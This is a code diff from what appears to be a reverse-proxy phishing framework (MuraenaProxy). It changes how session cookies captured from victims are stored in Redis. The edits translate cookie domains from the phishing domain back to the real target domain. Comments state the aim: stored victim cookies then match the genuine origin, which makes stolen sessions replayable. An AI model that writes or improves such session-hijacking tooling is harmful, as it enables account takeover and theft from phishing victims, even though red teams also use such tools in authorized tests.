@@ -271,16 +271,12 @@ skip:
 						c.Domain = request.Host
 					}
 
-					// remove any port from the cookie domain
+					// Remove port from the cookie domain
 					c.Domain = strings.Split(c.Domain, ":")[0]
 
-					// make the cookie domain wildcard
-					subdomains := strings.Split(c.Domain, ".")
-					if len(subdomains) > 2 {
-						c.Domain = fmt.Sprintf("%s", strings.Join(subdomains[1:], "."))
-					} else {
-						c.Domain = fmt.Sprintf("%s", c.Domain)
-					}
+					// Transform phishing domain to target domain using the replacer,
+					// so the cookie domain stored in Redis matches the real origin.
+					c.Domain = replacer.Transform(c.Domain, true, base64)
 
 					normalizedExpiry := db.NormalizeCookieExpiry(time.Time{})
 					sessCookie := db.VictimCookie{
@@ -530,13 +526,23 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 			}
 
 			if victim != nil {
-				// before transforming headers like cookies, store the cookies in the CookieJar
+				// Store cookies in the CookieJar.
+				// NOTE: response.Cookies() reads Set-Cookie headers AFTER backward transformation
+				// (target → phishing) at the header transform loop above, so cookies with explicit
+				// Domain attributes will have phishing domains. We forward-transform them back to
+				// target domains so Redis stores the original cookie domains.
 				for _, c := range response.Cookies() {
 					if c.Domain == "" {
 						c.Domain = response.Request.Host
 					}
 
 					c.Domain = strings.Replace(c.Domain, ":443", "", -1)
+
+					// Forward-transform phishing domain back to original target domain.
+					// For cookies without explicit Domain (set from Request.Host, already target),
+					// this is a no-op. For cookies with explicit Domain (backward-transformed to
+					// phishing), this recovers the original target domain.
+					c.Domain = replacer.Transform(c.Domain, true, base64)
 					normalizedExpiry := db.NormalizeCookieExpiry(c.Expires)
 					sessCookie := db.VictimCookie{
 						Name:     c.Name,
